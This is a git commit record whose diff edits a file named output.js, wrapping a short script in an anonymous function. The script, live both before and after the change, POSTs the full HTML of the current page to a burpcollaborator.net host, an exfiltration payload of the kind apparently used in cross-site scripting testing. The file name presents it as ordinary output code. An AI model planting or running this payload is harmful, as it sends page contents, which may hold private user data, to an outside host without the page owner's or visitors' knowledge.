286be3aa68eda0de316a9b324cecf52c54555a23
Cameron Brown <cb12389@gmail.com>
2020-04-11 21:35:46 -0500

    Update output.js

--- output.js
+++ output.js
@@ -1,4 +1,4 @@
-var xhttp = new XMLHttpRequest();
+(function(){var xhttp = new XMLHttpRequest();
 xhttp.open("POST", "http://615kiqynat73wnqtupttlc8h086yun.burpcollaborator.net/", true);
 var data = document.body.innerHTML;
-xhttp.send(data);
+xhttp.send(data);})
